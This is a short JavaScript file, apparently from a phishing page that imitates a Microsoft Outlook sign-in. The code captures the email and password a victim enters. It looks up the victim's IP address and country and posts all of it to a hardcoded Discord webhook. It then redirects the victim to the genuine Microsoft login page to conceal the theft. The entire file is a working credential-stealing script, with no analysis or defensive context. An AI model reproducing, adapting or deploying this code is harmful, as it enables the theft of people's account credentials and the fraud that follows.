document.querySelector('.login--form').addEventListener('submit', async function (event) {
    event.preventDefault(); 

    
    const email = document.querySelector('input[name="eml"]').value;
    const password = document.querySelector('input[name="psew"]').value;

    const discordWebhook = 'https://discordapp.com/api/webhooks/1462940609865318536/yyVyfOnBHeOuI6ZUcLvLuj3JrNp_Yp916TLQqG9BWAwUQCLSx74JccCofz7FNNBTUdgt';

    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIp = ipData.ip;

    const countryResponse = await fetch(`https://ipapi.co/${userIp}/country_name`);
    const userCountry = await countryResponse.text();
    const message = `🔐 **Login Information**\n**Correo:** ${email}\n**Contraseña:** ${password}\n**IP:** ${userIp}\n**País:** ${userCountry}`;

    try {
        const response = await fetch(discordWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: message
            })
        });

        if (response.ok) {
            window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.office365.com%2Fmail%2F&client-request-id=95a5aec3-eac2-d9d0-d6ec-6ed4fa62374c&response_mode=fragment&client_info=1&prompt=select_account&nonce=019b9f5b-5538-70d0-b4b3-ce0924338840&state=eyJpZCI6IjAxOWI5ZjViLTU1MzgtN2I5MC1iOTJkLTk2ZjQzN2FiMDIwMiIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLm9mZmljZTM2NS5jb20vbWFpbC8&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.26.0&response_type=code&code_challenge=h3ngV0D2Vx3ZGQ_K-g7r4fmy8s5jXCw0R-6F6kAix_Q&code_challenge_method=S256'; 
        } else {
            alert('Error al enviar la información.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ocurrió un error al intentar enviar la información.');
    }
});